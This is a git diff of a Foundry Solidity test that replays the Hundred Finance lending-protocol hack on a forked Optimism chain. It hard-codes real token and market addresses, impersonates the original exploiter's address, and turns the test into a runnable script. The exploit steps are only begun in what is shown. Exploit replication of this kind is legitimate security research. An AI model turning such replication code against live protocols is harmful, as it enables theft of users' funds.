@@ -2,6 +2,7 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
+import "forge-std/Script.sol";
 
 import {IERC20} from "../contracts/hack-replication/interfaces/IERC20.sol";
 import {crETH} from "../contracts/hack-replication/interfaces/crETH.sol";
@@ -18,22 +19,30 @@ import {IUnitroller} from "../contracts/hack-replication/interfaces/IUnitroller.
 // @Summary
 // check the log in the terminal
 
-contract HundredFinanceHackReplicator is Test {
+contract HundredFinanceHackReplicator is Script, Test {
     IERC20 WBTC = IERC20(0x68f180fcCe6836688e9084f035309E29Bf0A2095);
     IERC20 USDC = IERC20(0x7F5c764cBc14f9669B88837ca1490cCa17c31607);
     IERC20 SNX = IERC20(0x8700dAec35aF8Ff88c16BdF0418774CB3D7599B4);
     IERC20 sUSD = IERC20(0x8c6f28f2F1A3C87F0f938b96d27520d9751ec8d9);
     IERC20 USDT = IERC20(0x94b008aA00579c1307B0EF2c499aD98a8ce58e58);
     IERC20 DAI = IERC20(0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1);
+    ICErc20Delegate hWBTC =
+        ICErc20Delegate(0x35594E4992DFefcB0C20EC487d7af22a30bDec60);
+    crETH CEther = crETH(0x1A61A72F5Cf5e857f15ee502210b81f8B3a66263);
 
-    crETH private CEther;
-    ICErc20Delegate private hWBTC;
-    ICErc20Delegate private hSNX;
-    ICErc20Delegate private hUSDC;
-    ICErc20Delegate private hDAI;
-    ICErc20Delegate private hUSDT;
-    ICErc20Delegate private hSUSD;
-    ICErc20Delegate private hFRAX;
+    // h (c) tokens
+    ICErc20Delegate hSNX =
+        ICErc20Delegate(0x371cb7683bA0639A21f31E0B20F705e45bC18896);
+    ICErc20Delegate hUSDC =
+        ICErc20Delegate(0x10E08556D6FdD62A9CE5B3a5b07B0d8b0D093164);
+    ICErc20Delegate hDAI =
+        ICErc20Delegate(0x0145BE461a112c60c12c34d5Bc538d10670E99Ab);
+    ICErc20Delegate hUSDT =
+        ICErc20Delegate(0xb994B84bD13f7c8dD3af5BEe9dfAc68436DCF5BD);
+    ICErc20Delegate hSUSD =
+        ICErc20Delegate(0x76E47710AEe13581Ba5B19323325cA31c48d4cC3);
+    ICErc20Delegate hFRAX =
+        ICErc20Delegate(0xd97a2591930E2Da927b1903BAA6763618BD7425b);
 
     IUnitroller unitroller =
         IUnitroller(0x5a5755E1916F547D04eF43176d4cbe0de4503d5d);
@@ -42,55 +51,13 @@ contract HundredFinanceHackReplicator is Test {
     address HundredFinanceExploiter =
         0x155DA45D374A286d383839b1eF27567A15E67528;
 
+    function run() public {
+        setUp();
+        testExploit();
+    }
+
     function setUp() public {
-        // TODO: delete this line to run tests on anvil blockchain
         vm.createSelectFork("optimism", 90_760_765);
-
-        bytes memory modifiedCErc20DelegateBytecode = vm.getDeployedCode(
-            "./artifacts/CErc20Delegate.sol/CErc20Delegate.json"
-        );
-        // TODO: retrieve modified crETH byte code
-        // TODO: assign retrieved modified crETH byte code to crETH address
-        // vm.etch(0x1A61A72F5Cf5e857f15ee502210b81f8B3a66263, modifiedCrETHBytecode);
-
-        vm.etch(
-            0x35594E4992DFefcB0C20EC487d7af22a30bDec60,
-            modifiedCErc20DelegateBytecode
-        );
-        vm.etch(
-            0x371cb7683bA0639A21f31E0B20F705e45bC18896,
-            modifiedCErc20DelegateBytecode
-        );
-        vm.etch(
-            0x10E08556D6FdD62A9CE5B3a5b07B0d8b0D093164,
-            modifiedCErc20DelegateBytecode
-        );
-        vm.etch(
-            0x0145BE461a112c60c12c34d5Bc538d10670E99Ab,
-            modifiedCErc20DelegateBytecode
-        );
-        vm.etch(
-            0xb994B84bD13f7c8dD3af5BEe9dfAc68436DCF5BD,
-            modifiedCErc20DelegateBytecode
-        );
-        vm.etch(
-            0x76E47710AEe13581Ba5B19323325cA31c48d4cC3,
-            modifiedCErc20DelegateBytecode
-        );
-        vm.etch(
-            0xd97a2591930E2Da927b1903BAA6763618BD7425b,
-            modifiedCErc20DelegateBytecode
-        );
-
-        CEther = crETH(0x1A61A72F5Cf5e857f15ee502210b81f8B3a66263);
-        hWBTC = ICErc20Delegate(0x35594E4992DFefcB0C20EC487d7af22a30bDec60);
-        hSNX = ICErc20Delegate(0x371cb7683bA0639A21f31E0B20F705e45bC18896);
-        hUSDC = ICErc20Delegate(0x10E08556D6FdD62A9CE5B3a5b07B0d8b0D093164);
-        hDAI = ICErc20Delegate(0x0145BE461a112c60c12c34d5Bc538d10670E99Ab);
-        hUSDT = ICErc20Delegate(0xb994B84bD13f7c8dD3af5BEe9dfAc68436DCF5BD);
-        hSUSD = ICErc20Delegate(0x76E47710AEe13581Ba5B19323325cA31c48d4cC3);
-        hFRAX = ICErc20Delegate(0xd97a2591930E2Da927b1903BAA6763618BD7425b);
-
         vm.label(address(WBTC), "WBTC");
         vm.label(address(USDC), "USDC");
         vm.label(address(SNX), "SNX");
@@ -107,9 +74,11 @@ contract HundredFinanceHackReplicator is Test {
         vm.label(address(hFRAX), "hFRAX");
         vm.label(address(aaveV3), "aaveV3");
         vm.label(address(unitroller), "unitroller");
+
+        // use "etch" cheatcode to copy the bytecode of our modified cErc20Delegate contract to the hTokens
     }
 
-    function testExploit() external {
+    function testExploit() public {
         payable(address(0)).transfer(address(this).balance);
         vm.startPrank(HundredFinanceExploiter);
         hWBTC.transfer(address(this), 1_503_167_295); // anti front-run ?
